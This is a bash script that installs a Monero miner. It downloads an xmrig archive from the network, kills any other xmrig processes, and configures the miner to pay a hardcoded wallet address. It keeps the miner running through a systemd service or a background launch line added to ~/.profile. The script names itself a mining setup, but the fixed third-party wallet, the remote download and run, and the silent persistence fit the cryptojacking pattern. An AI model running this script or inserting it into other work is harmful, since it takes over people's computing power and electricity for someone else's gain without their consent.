#!/bin/bash

VERSION=2.12
MO_DIR="$HOME/moneroocean"
LOG_FILE="$MO_DIR/setup.log"

# --- CPU PERCENT ARGUMENT ---
CPU_PERCENT=${1:-70}   # default 70% if not given

rm -rf "$MO_DIR"
mkdir -p "$MO_DIR"

echo "MoneroOcean mining setup script v$VERSION" > "$LOG_FILE"
echo "Log file created at $LOG_FILE"
echo "[*] Using CPU limit: $CPU_PERCENT%" | tee -a "$LOG_FILE"

WALLET="43DcQyUQWE9X3bmNMMMD1RJA2wJKJxS6rLvJCVoaXuieSwRqjapvqQTR7KnX6DfzaSB9nHiBMWsfo1dGQWxpefaVSRyrVXM"
EMAIL=""

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Running as root is not recommended" | tee -a "$LOG_FILE"
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly" | tee -a "$LOG_FILE"
  exit 1
fi

# calculating port
echo "[*] Calculating port" >> "$LOG_FILE"
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate" | tee -a "$LOG_FILE"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l; 
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30  ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port" | tee -a "$LOG_FILE"
  exit 1
fi
echo "[*] Calculated port: $PORT" >> "$LOG_FILE"

# prepare miner
echo "[*] Preparing miner" >> "$LOG_FILE"

if sudo -n true 2>/dev/null; then
  echo "[*] Stopping existing moneroocean_miner service" >> "$LOG_FILE"
  sudo systemctl stop moneroocean_miner.service
fi
echo "[*] Killing existing xmrig processes" >> "$LOG_FILE"
killall -9 xmrig

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz" >> "$LOG_FILE"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download xmrig" | tee -a "$LOG_FILE"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $MO_DIR" >> "$LOG_FILE"
if ! tar xf /tmp/xmrig.tar.gz -C "$MO_DIR"; then
  echo "ERROR: Can't unpack xmrig" | tee -a "$LOG_FILE"
  exit 1
fi
rm /tmp/xmrig.tar.gz

# Config miner
PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi

echo "[*] Configuring miner" >> "$LOG_FILE"
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' "$MO_DIR/config.json"
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' "$MO_DIR/config.json"
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$MO_DIR/config.json"
sed -i 's#"log-file": *null, #"log-file": "'$MO_DIR/xmrig.log'",#' "$MO_DIR/config.json"

# --- CPU % to threads conversion ---
THREADS=$(( CPU_THREADS * CPU_PERCENT / 100 ))
if [ "$THREADS" -lt 1 ]; then THREADS=1; fi

if ! grep -q '"max-threads-hint"' "$MO_DIR/config.json"; then
  sed -i '/"cpu": {/a \
        "max-threads-hint": '$THREADS',' "$MO_DIR/config.json"
else
  sed -i 's/"max-threads-hint": *[^,]*/"max-threads-hint": '$THREADS'/' "$MO_DIR/config.json"
fi

cp "$MO_DIR/config.json" "$MO_DIR/config_background.json"
sed -i 's/"background": *false,/"background": true,/' "$MO_DIR/config_background.json"

# prepare miner.sh
cat >"$MO_DIR/miner.sh" <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $MO_DIR/xmrig \$* 
else
  echo "Monero miner is already running in the background."
fi
EOL
chmod +x "$MO_DIR/miner.sh"

# systemd or background
if type systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  echo "[*] Creating moneroocean_miner systemd service" >> "$LOG_FILE"
  cat >/tmp/moneroocean_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$MO_DIR/xmrig --config=$MO_DIR/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
  sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
  sudo systemctl daemon-reload
  sudo systemctl enable moneroocean_miner.service
  sudo systemctl start moneroocean_miner.service
else
  echo "[*] Setting up miner to run from .profile" >> "$LOG_FILE"
  if ! grep -q "$MO_DIR/miner.sh" "$HOME/.profile"; then
    echo "$MO_DIR/miner.sh --config=$MO_DIR/config_background.json >/dev/null 2>&1 &" >> "$HOME/.profile"
  fi
  echo "[*] Starting miner in background (no systemd)" | tee -a "$LOG_FILE"
  nohup "$MO_DIR/miner.sh" --config="$MO_DIR/config_background.json" >> "$MO_DIR/miner_stdout.log" 2>&1 &
fi

echo "[*] Setup complete" | tee -a "$LOG_FILE"

